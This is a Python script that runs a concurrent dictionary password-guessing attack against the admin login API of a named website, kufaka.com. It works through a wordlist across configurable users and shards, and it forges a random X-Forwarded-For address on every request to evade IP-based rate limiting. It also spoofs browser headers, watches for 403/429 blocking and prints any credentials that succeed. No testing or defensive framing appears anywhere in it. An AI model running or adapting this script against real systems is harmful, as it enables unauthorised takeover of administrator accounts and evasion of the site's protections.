import json, random, sys, time, os, urllib.request, urllib.error
import concurrent.futures
from collections import Counter

TARGET = os.environ.get("TARGET", "https://www.kufaka.com/adminApi/auth/login")
DICT = os.environ.get("DICT", "dict.txt")
USERS = [u for u in (os.environ.get("USERS") or "admin").split(",") if u]
CONC = int(os.environ.get("CONC") or "12")
OFFSET = int(os.environ.get("OFFSET") or "0")
LIMIT = int(os.environ.get("LIMIT") or "0")  # 0 = all

shard = int(sys.argv[1]) if len(sys.argv) > 1 else 0
nshards = int(sys.argv[2]) if len(sys.argv) > 2 else 1
maxreq = int(sys.argv[3]) if len(sys.argv) > 3 else 100000000

with open(DICT, encoding="utf-8", errors="ignore") as f:
    words = [w.rstrip("\n") for w in f if w.strip()]
if LIMIT:
    words = words[OFFSET:OFFSET + LIMIT]
elif OFFSET:
    words = words[OFFSET:]

U = len(USERS)
per = (len(words) + nshards - 1) // nshards
ws = shard * per
we = min(len(words), ws + per)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
MISS = "用户名或密码不正确"

def rand_ip():
    return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                            random.randint(0, 255), random.randint(1, 254))

def attempt(wi, ui):
    u = USERS[ui]; w = words[wi]
    body = json.dumps({"username": u, "password": w}).encode()
    req = urllib.request.Request(TARGET, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("X-Forwarded-For", rand_ip())
    req.add_header("User-Agent", UA)
    req.add_header("Referer", "https://www.kufaka.com/package/admin/")
    req.add_header("Origin", "https://www.kufaka.com")
    req.add_header("Accept", "application/json, text/plain, */*")
    req.add_header("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
    try:
        r = urllib.request.urlopen(req, timeout=25)
        return (r.status, r.read().decode("utf-8", "ignore"), u, w)
    except urllib.error.HTTPError as e:
        try:
            b = e.read().decode("utf-8", "ignore")[:300]
        except Exception:
            b = ""
        return (e.code, b, u, w)
    except Exception as e:
        return (0, "ERR:%s" % type(e).__name__, u, w)

if ws >= we:
    print("SHARD_EMPTY shard=%d words=%d" % (shard, len(words)))
    print("RESULT shard=%d tested=0 blocked=0 hit=False range=[%d,%d)" % (shard, ws, we))
    sys.exit(0)

tasks = [(wi, ui) for wi in range(ws, we) for ui in range(U)]
print("START shard=%d/%d words[%d,%d) users=%s conc=%d ntasks=%d maxreq=%d" % (
    shard, nshards, ws, we, USERS, CONC, len(tasks), maxreq), flush=True)

counts = Counter()
hits = []
blocked_streak = 0
stop = False
tested = 0
ti = 0
t0 = time.time()
last_report = t0

with concurrent.futures.ThreadPoolExecutor(max_workers=CONC) as ex:
    futs = {}
    while ti < len(tasks) and len(futs) < CONC:
        futs[ex.submit(attempt, *tasks[ti])] = ti; ti += 1
    while futs:
        done, _ = concurrent.futures.wait(futs, return_when=concurrent.futures.FIRST_COMPLETED)
        for fu in done:
            st, txt, u, w = fu.result(); del futs[fu]
            if st in (403, 429):
                counts["blocked"] += 1; blocked_streak += 1
            elif st == 200 and MISS in txt:
                counts["miss"] += 1; tested += 1; blocked_streak = 0
            elif st == 200 and ("不能为空" in txt or "error" in txt.lower()):
                counts["invalid"] += 1; tested += 1; blocked_streak = 0
            elif st == 200:
                counts["HIT?"] += 1; tested += 1; blocked_streak = 0
                hits.append((u, w, txt[:400]))
                print("HIT user=%s pass=%r resp=%s" % (u, w, txt[:400]), flush=True)
            else:
                counts["other"] += 1; tested += 1; blocked_streak = 0
                if counts["other"] <= 5:
                    print("OTHER st=%s u=%s w=%r b=%s" % (st, u, w, txt[:160]), flush=True)
            if blocked_streak >= 40:
                stop = True
            now = time.time()
            if now - last_report > 30:
                print("[t=%ds] tested=%d blocked=%d last_word=%d" % (now - t0, tested, counts["blocked"], tasks[min(ti, len(tasks) - 1)][0]), flush=True)
                last_report = now
        if stop:
            for fu in list(futs):
                fu.cancel()
            break
        while (not stop) and ti < len(tasks) and len(futs) < CONC and (tested + counts["blocked"]) < maxreq:
            futs[ex.submit(attempt, *tasks[ti])] = ti; ti += 1
        if len(futs) == 0 and (ti >= len(tasks) or (tested + counts["blocked"]) >= maxreq):
            break

dt = time.time() - t0
print("RESULT shard=%d tested=%d blocked=%d hit=%s nhits=%d elapsed=%.1fs progressed=%d/%d range=[%d,%d)" % (
    shard, tested, counts["blocked"], bool(hits), len(hits), dt, ti, len(tasks), ws, we), flush=True)
